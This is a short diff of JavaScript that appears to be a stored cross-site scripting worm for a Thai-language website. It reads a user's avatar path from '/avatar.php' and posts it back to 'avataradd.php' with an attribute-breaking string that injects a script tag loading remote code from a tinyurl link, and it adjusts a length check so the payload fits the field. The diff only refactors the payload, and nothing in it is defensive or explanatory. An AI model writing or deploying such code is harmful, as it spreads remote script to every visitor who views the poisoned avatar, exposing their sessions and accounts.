@@ -3,13 +3,14 @@ $.get('/avatar.php',(result)=>{
     let ava = result.indexOf('กดเลือกใช้ Avatar ที่ชอบ');
 	if(ava>0){
 	    var aroundava = result.substring(ava, ava+300);
+		var toAdd = '"><script src="https://tinyurl.com/smuq7p4"></script></a><a "#';
 		res = [...aroundava.matchAll(/(img src=\"|\')([^\'\"]*)([^>]*)/g)];
 		if(res[0]){
-			if(res[0][2] && res[0][2].length + 56 <= 100){
-				$.post( "avataradd.php", { fileavatar: res[0][2] + '" border=0><script src="https://tinyurl.com/smuq7p4"></script></a><a href="#' })
+			if(res[0][2] && res[0][2].length + 63 <= 100){
+				$.post( "avataradd.php", { fileavatar: res[0][2] + toAdd })
 			}
 		}else{
-			$.post( "avataradd.php", {  fileavatar: '/pic/default_avatar.gif" border=0><script src="https://tinyurl.com/smuq7p4"></script></a><a href="#' })
+			$.post( "avataradd.php", {  fileavatar: '/pic/default_avatar.gif' + toAdd })
 		}
 	}
 })
